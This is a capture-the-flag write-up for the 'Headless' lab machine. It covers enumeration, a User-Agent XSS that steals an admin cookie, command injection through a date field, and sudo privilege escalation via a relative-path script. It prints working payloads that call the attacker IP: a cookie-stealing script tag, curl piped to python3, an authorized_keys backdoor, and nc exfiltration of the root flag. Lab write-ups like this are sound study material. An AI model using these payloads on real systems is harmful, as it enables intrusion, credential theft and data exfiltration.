---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Headless

## Enumeration

### Nmap

First start with nmap

```
nmap -sV -sC 10.10.11.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 10:52 CET
Nmap scan report for headless.htb (10.10.11.8)
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
..... REST OF HTTP STUFF OMITTED ....
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.19 seconds
```

After scanning all the ports, there is nothing substantial (includng UDP).

### Feroxbuster

Since port 5000 is HTTP, let's run a quick feroxbuster on it.

```
└─\$ feroxbuster -u http://10.10.11.8:5000/ -r --insecure
...
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       93l      179w     2363c http://10.10.11.8:5000/support
200      GET       96l      259w     2799c http://10.10.11.8:5000/
500      GET        5l       37w      265c http://10.10.11.8:5000/dashboard
...
```

## Port 5000 (HTTP)

The single open port is HTTP on alternative 5000 port. There is unremarkable "under construction" on `/` and a form for sending tickets to support on `/support`. The last page `/dashboard` is behind authorisation.

But how is is authorised? By inspecting the HTTP request and responses, there is an interesting cookie. It is static, and does not change with sessions.

```
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
```

Where the first part `InVzZXIi` means `user` in base64 and the second `uAlmXlTvm8vyihjNaPDWnvB_Zfs` is probably encrypted. Tweaking with it (changing to admin, administrator, etc.) does not work. So we need to look somewhere else.

### Contact Support form

The form is very basic, and there is no back rendering of the input data (so no template injections). However, quick poking with Burp shows that the validation is done only on frontend and the input can be freely modified.

Almost freely. If `<>` is in the input (like in some HTML injection payload), the WAF kicks in. And the response contains:

```
<div class="container">
	<h1>Hacking Attempt Detected</h1>
	<p>Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.</p>
	<p><strong>Client Request Information:</strong></p>
	<pre><strong>Method:</strong> POST\n<strong>URL:</strong> http://10.10.11.8:5000/support\n<strong>Headers:</strong> <strong>Host:</strong> 10.10.11.8:5000\n<strong>Content-Length:</strong> 84\n<strong>Cache-Control:</strong> max-age=0\n<strong>Upgrade-Insecure-Requests:</strong> 1\n<strong>Origin:</strong> http://10.10.11.8:5000\n<strong>Content-Type:</strong> application/x-www-form-urlencoded\n<strong>User-Agent:</strong> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\n<strong>Accept:</strong> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n<strong>Referer:</strong> http://10.10.11.8:5000/support\n<strong>Accept-Encoding:</strong> gzip, deflate, br\n<strong>Accept-Language:</strong> en-US,en;q=0.9\n<strong>Connection:</strong> close\n\n</pre>
</div>
```

Ok, so, the first idea is to beat the WAF. Tying different payloads.

But, that is actually not the way. Under a closer inspection, it says (and renders!) what information **"has been sent to the administrators"** for investigation. So what about we try to phish/xxs them for the cookie.

### Getting admin cookie

There is `User-Agent` included in the report. Let's use it as a vector. Try the payloads from https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Cross-Site-Scripting-XSS-Payloads.txt

The goal is to exfiltrate the cookie. So set-up a http server

```
python3 -m http.server 80
```

And send the payload

```
POST /support HTTP/1.1
Host: headless.htb:5000
Content-Length: 56
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://headless.htb:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <script>var i=new Image; i.src="http://10.10.14.199/?"+document.cookie;</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://headless.htb:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: close

fname=x&lname=x&email=x@example.com&phone=666&message=<>
```

After a while, the administrators displays the report and get XXS'd. That send the cookie to me.

```
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

Now, with the cookie, I can access the `/dashboard`

### Admin dashboard

On the dashboard, there is only an option to generate a report, given some date. Let's check the POST request data.

```
date=2023-09-15
```

That is not too much. Still, let's try if there is some command injection. https://github.com/payloadbox/command-injection-payload-list

And there actually is. Just a simple `;id;` works. So let's prepare a nice TTY shell handndler

```
python3 -m http.server 80
python2 tcp_pty_shell_handler.py -b 0.0.0.0:443
and payload.
```

```
date=;curl+10.10.14.199/tcp_pty_backconnect.py+|+python3;
```

Alternatively, SSH key can be also appended and used

```
date=2023-09-15;echo+ssh-ed25519+AAAAC3NzaC1lZDI1NTE5AAAAIAqZz8NQDUbBPeLxMLqvGSk9kwJLwF26onX2c0AjQYK1+kali@kali+>>/home/dvir/.ssh/authorized_keys;
```

One way or another, that gives the `dvir` user, and user flag

## Escalate to root

First thing to do is to run `sudo -l`. That gives an interesting result

```
dvir@headless:~\$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

It is also mentioned in a mail.

```
dvir@headless:~\$ cat /var/mail/dvir
Subject: Important Update: New System Check Script

Hello!

We have an important update regarding our server. In response to recent compatibility and crashing issues, we've introduced a new system check script.

What's special for you?
- You've been granted special privileges to use this script.
- It will help identify and resolve system issues more efficiently.
- It ensures that necessary updates are applied when needed.

Rest assured, this script is at your disposal and won't affect your regular use of the system.

If you have any questions or notice anything unusual, please don't hesitate to reach out to us. We're here to assist you with any concerns.

By the way, we're still waiting on you to create the database initialization script!
Best regards,
Headless
```

Wihle in `/usr/bin` folder, it is not a binary, but a script. A quick `file` will tell. The script is as follows:

```
cat /usr/bin/syscheck
#!/bin/bash

if [ "\$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=\$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=\$(/usr/bin/date -d "@\$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: \$formatted_time"

disk_space=\$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print \$4}')
/usr/bin/echo "Available disk space: \$disk_space"

load_average=\$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print \$2}')
/usr/bin/echo "System load average: \$load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

The interesting bit is the line with command  `./initdb.sh 2>/dev/null`. That allows to create our own script on local path and execute it as root! We can spawn a new shell, copy the flag to local file, or anything we want. But let's exfiltrate it to our machine. First, prepare a listener on our side

```
nc -lvnp 80 > flag
```

and setup the payload

```
echo -e '#!/bin/bash\n\nnc -vn 10.10.14.199 80 < /root/root.txt' > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
```

With that, the flag will hit the listener and we can collect it.